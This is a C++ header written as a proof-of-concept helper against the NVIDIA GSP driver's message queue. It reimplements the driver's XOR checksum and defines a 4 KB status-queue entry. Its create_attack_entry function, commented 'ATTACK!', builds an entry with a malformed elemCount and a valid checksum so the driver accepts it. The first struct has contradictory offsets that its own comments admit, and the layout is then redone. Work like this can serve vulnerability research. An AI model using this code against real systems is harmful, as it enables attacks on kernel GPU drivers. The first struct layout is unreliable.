// checksum_helper.h - POC Checksum Calculation Helper
//
// Implements the same checksum algorithm used by NVIDIA GSP driver
// Based on: src/nvidia/inc/kernel/gpu/gsp/message_queue_priv.h:112-124

#ifndef CHECKSUM_HELPER_H
#define CHECKSUM_HELPER_H

#include <cstdint>
#include <cstring>

namespace poc
{

// Calculate XOR-based 32-bit checksum (same as _checkSum32 in driver)
inline uint32_t calculate_checksum(const void *data, uint32_t len)
{
    const uint64_t *p = reinterpret_cast<const uint64_t *>(data);
    const uint64_t *pEnd = reinterpret_cast<const uint64_t *>(reinterpret_cast<uintptr_t>(data) + len);
    uint64_t checkSum = 0;

    // XOR all 8-byte words
    while (p < pEnd)
    {
        checkSum ^= *p++;
    }

    // Fold 64-bit result to 32-bit (XOR high with low)
    uint32_t high = static_cast<uint32_t>(checkSum >> 32);
    uint32_t low = static_cast<uint32_t>(checkSum & 0xFFFFFFFFUL);

    return high ^ low;
}

// Verify checksum of a message
// Returns true if checksum is valid (checksum field XORed with data equals 0)
inline bool verify_checksum(const void *data, uint32_t len)
{
    return calculate_checksum(data, len) == 0;
}

// Structure for Status Queue entry (simplified)
struct __attribute__((packed)) StatusQueueEntry
{
    // 0x00-0x1F: Header (varies by message)
    uint8_t header[32];

    // 0x20-0x27: Checksum (64-bit but only low 32-bit used?)
    uint32_t checkSum_low;
    uint32_t checkSum_high; // Usually same as low?

    // 0x24-0x27: SeqNum (overlaps with checksum high bytes!)
    // Actually at 0x24:
    uint32_t seqNum; // This is at offset 0x24, overlaps!

    // 0x28-0x2B: ElemCount
    uint32_t elemCount;

    // 0x2C-0x2F: Reserved/padding
    uint32_t reserved;

    // 0x30-0x33: RPC header
    uint32_t rpc_version; // Usually 0x03000000

    // 0x34-0x37: RPC signature "VRPC" = 0x43505256
    uint32_t rpc_signature;

    // 0x38-0x3B: RPC length (payload size)
    uint32_t rpc_length;

    // 0x3C-0x3F: RPC message ID
    uint32_t rpc_messageId;

    // 0x40+: RPC payload data
    uint8_t rpc_data[4096 - 0x40];
};

// Actually, looking at the data more carefully:
// The structure seems to be:
struct __attribute__((packed)) StatusQueueEntryV2
{
    uint8_t header[32];     // 0x00-0x1F
    uint32_t checkSum;      // 0x20-0x23 (low 32 bits)
    uint32_t seqNum;        // 0x24-0x27
    uint32_t elemCount;     // 0x28-0x2B
    uint32_t reserved;      // 0x2C-0x2F
    uint32_t rpc_version;   // 0x30-0x33
    uint32_t rpc_signature; // 0x34-0x37 ("VRPC")
    uint32_t rpc_length;    // 0x38-0x3B
    uint32_t rpc_messageId; // 0x3C-0x3F
    uint8_t rpc_data[4032]; // 0x40-0xFFF (4096 - 64 = 4032)
};

static_assert(sizeof(StatusQueueEntryV2) == 4096, "Entry must be exactly 4KB");

// Helper: Calculate checksum for a constructed entry
// Sets checksum field to make overall checksum == 0
inline void set_valid_checksum(StatusQueueEntryV2 &entry)
{
    // First, zero out the checksum field
    entry.checkSum = 0;

    // Calculate checksum over the entire checksummed range
    // Non-CC mode: GSP_MSG_QUEUE_ELEMENT_HDR_SIZE + rpc.length
    // Let's use a conservative range that includes all critical fields
    uint32_t checksum_range = 0x30 + entry.rpc_length; // Header + RPC payload

    // Calculate what the checksum would be
    uint32_t calculated = calculate_checksum(&entry, checksum_range);

    // Set checksum to the XOR complement so total becomes 0
    entry.checkSum = calculated;
}

// Helper: Create a minimal valid RPC message with elemCount=17
inline StatusQueueEntryV2 create_attack_entry(uint32_t seqNum)
{
    StatusQueueEntryV2 entry;
    std::memset(&entry, 0, sizeof(entry));

    // Set fields
    entry.seqNum = seqNum;
    entry.elemCount = 17; // ATTACK!

    // Set minimal valid RPC header
    entry.rpc_version = 0x03000000;
    entry.rpc_signature = 0x43505256; // "VRPC"
    entry.rpc_length = 0x20;          // Minimal payload (32 bytes)
    entry.rpc_messageId = 0x1001;     // Some valid message ID

    // Calculate and set valid checksum
    set_valid_checksum(entry);

    return entry;
}

} // namespace poc

#endif // CHECKSUM_HELPER_H